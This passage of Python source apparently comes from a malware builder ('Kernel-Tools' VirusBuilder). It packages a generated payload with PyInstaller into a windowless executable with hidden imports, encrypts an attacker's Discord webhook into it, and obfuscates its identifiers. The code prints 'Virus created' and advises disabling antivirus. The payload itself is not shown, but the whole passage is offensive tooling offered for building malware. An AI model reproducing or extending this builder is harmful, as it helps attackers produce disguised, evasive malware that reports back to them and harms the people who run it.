        'discord.player',
        'discord.opus',
        'discord.sinks',
        'discord.utils',
        'discord.abc',
        'discord.interactions',
        'discord.integrations',
        'discord.audit_logs',
        'discord.raw_models',
        'discord.scheduled_event',
        'discord.stage_instance',
        'discord.sticker',
        'discord.team',
        'discord.template',
        'discord.welcome_screen',
        'discord.automod',
        'aiohttp',
        'aiohttp.client',
        'aiohttp.connector',
        'aiohttp.helpers',
        'aiohttp.http',
        'aiohttp.streams',
        'aiohttp.web',
        'multidict',
        'yarl',
        'async_timeout',
        'asyncio',
        'requests',
        'urllib3',
        'certifi',
        'charset_normalizer',
        'idna',
        'cryptography',
        'cryptography.hazmat',
        'cryptography.hazmat.primitives',
        'cryptography.hazmat.primitives.hashes',
        'cryptography.hazmat.primitives.kdf',
        'cryptography.hazmat.primitives.kdf.pbkdf2',
        'cryptography.hazmat.primitives.ciphers',
        'cryptography.hazmat.primitives.ciphers.algorithms',
        'cryptography.hazmat.primitives.ciphers.modes',
        'cryptography.hazmat.primitives.padding',
        'cryptography.hazmat.backends',
        'cryptography.hazmat.backends.default_backend',
        'cryptography.hazmat.backends.openssl',
        'cryptography.hazmat.backends.openssl.backend',
        'zipfile',
        'io',
        'json',
        'base64',
        'socket',
        'threading',
        'urllib',
        'urllib.request',
        'subprocess',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{name_file}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon={repr(icon_path) if icon_path and os.path.exists(icon_path) else 'None'},
)
'''
        spec_file = os.path.join(os.path.dirname(file_python), f"{name_file}.spec")
        with open(spec_file, 'w', encoding='utf-8') as f:
            f.write(spec_content)
        print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} PyInstaller spec created{RESET}")
        return spec_file

    def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        if sys.platform.startswith("win"):
            py = "python"
            pip_extra = []
        else:
            py = "python3"
            pip_extra = ["--break-system-packages"]
        
        print(f"{BEFORE}{current_time_hour()}{AFTER} {WAIT} Uninstallation of pathlib..{RESET}")
        subprocess.run([py, "-m", "pip", "uninstall", "pathlib", "-y"] + pip_extra, 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{BEFORE}{current_time_hour()}{AFTER} {WAIT} Upgrade pyinstaller..{RESET}")
        result = subprocess.run([py, "-m", "pip", "install", "--upgrade", "pyinstaller"] + pip_extra,
                                capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} PyInstaller install failed:{RESET}")
            if result.stderr:
                print(result.stderr[:500])
            print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Python file available: {white}{file_python}{RESET}")
            print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} .exe conversion failed. Python .py file is available.{RESET}")
            return

        print(f"{BEFORE}{current_time_hour()}{AFTER} {WAIT} Creating spec with hidden imports..{RESET}")
        spec_file = create_pyinstaller_spec(file_python, name_file, icon_path, path_destination)
        
        print(f"{BEFORE}{current_time_hour()}{AFTER} {WAIT} Converting to executable (1-2 min)..{RESET}")
        try:
            working_directory = os.path.dirname(file_python)
            os.chdir(working_directory)
            pyinstaller = ['pyinstaller', '--distpath', path_destination, '--clean', spec_file]
            result = subprocess.run(pyinstaller, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.stderr:
                if "completed successfully" not in result.stderr:
                    print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Error during conversion: {white}{result.stderr[:300]}{RESET}")
                    Continue()
                    Reset()
                else:
                    print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Conversion successful.{RESET}")
                    print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Dependencies embedded: win32api, discord, cryptography{RESET}")
            else:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Conversion successful.{RESET}")
                print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Dependencies embedded: win32api, discord, cryptography{RESET}")
            try:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {WAIT} Removing temporary files..{RESET}")
                shutil.rmtree(os.path.join(working_directory, "build"), ignore_errors=True)
                if os.path.exists(spec_file):   os.remove(spec_file)
                if os.path.exists(file_python): os.remove(file_python)
                print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Temporary files removed.{RESET}")
            except Exception as e:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Temp files not removed: {white}{e}{RESET}")
        except Exception as e:
            print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Error during conversion: {white}{e}{RESET}")
            Continue()
            Reset()

    # ── Paths ────────────────────────────────────────────────────────────────────
    if sys.platform.startswith("win"):
        file_python_relative      = f'1-Output\\VirusBuilder\\{name_file}.py'
        path_destination_relative = "1-Output\\VirusBuilder"
    else:
        file_python_relative      = f'1-Output/VirusBuilder/{name_file}.py'
        path_destination_relative = "1-Output/VirusBuilder"

    file_python      = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

    # ── BuilderOptions ──────────────────────────────────────────────────────────
    avatar_webhook   = ""
    website          = github_tool
    color_webhook    = 0x2563eb
    username_webhook = f"Kernel-Tools {version_tool}"

    from FileDetectedByAntivirus.BuilderOptions import *

    # ── Build ────────────────────────────────────────────────────────────────────
    key_encryption, webhook_encrypted = Encryption(webhook)
    PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
    PythonIdentifierObfuscation(file_python)

    if file_type == "Exe File":
        os.makedirs(path_destination, exist_ok=True)
        if os.path.exists(file_python):
            if icon_path and os.path.exists(icon_path):
                ConvertToExe(file_python, path_destination, name_file, icon_path)
            else:
                ConvertToExe(file_python, path_destination, name_file)
        else:
            print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Python file deleted by antivirus. Disable AV and retry.{RESET}")

    print(f"\n{BEFORE}{current_time_hour()}{AFTER} {ADD} Virus created: {white}{path_destination_relative}{RESET}")
    try:
        if sys.platform.startswith("win"):
            os.startfile(path_destination)
        elif sys.platform.startswith("linux"):
            subprocess.Popen(["xdg-open", path_destination])
    except: pass
    try: SendWebhook(webhook)
    except: pass
    Continue()
    Reset()

except Exception as e:
    Error(e)
    Continue()
    Reset()
